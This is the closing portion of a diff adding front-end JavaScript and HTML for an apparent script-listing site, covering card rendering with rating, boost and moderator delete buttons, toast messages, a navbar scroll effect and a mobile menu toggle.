+                        <span class="free-badge">🆓 Free</span>
+                        <div style="display:flex; align-items:center; gap:8px;">
+                            <span>⭐ ${s.rating}</span>
+                            ${boosted ? `<span class="boost-timer">🔥${timeLeft}</span>` : `<button class="btn btn-boost btn-sm" onclick="event.stopPropagation(); window.openBoostModalById(${s.id})">🚀 Boost</button>`}
+                            ${moderatorMode && currentUser && currentUser.role === 'moderator' && s.uploaded ? `<button class="btn btn-sm" style="background:var(--red);color:#fff;" onclick="event.stopPropagation(); window.deleteScriptById(${s.id})">🗑️</button>` : ''}
+                        </div>
+                    </div>
+                </div>`; }).join('');
+            }
+
+            function showToast(msg) {
+                toast.textContent = msg;
+                toast.className = 'toast success show';
+                setTimeout(() => toast.classList.remove('show'), 2000);
+            }
+
+            window.addEventListener('scroll', () => navbar.classList.toggle('scrolled', window.scrollY > 50));
+            document.getElementById('mobileMenuBtn').addEventListener('click', () => {
+                const nav = document.getElementById('navLinks');
+                nav.classList.toggle('mobile-open');
+                document.getElementById('mobileMenuBtn').textContent = nav.classList.contains('mobile-open') ? '✕' : '☰';
+            });
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') document.querySelectorAll('.modal-overlay.open').forEach(m => closeModal(m));
+            });
+
+            updateAuthUI();
+            renderScripts();
+        })();
+    </script>
+</body>
+</html>
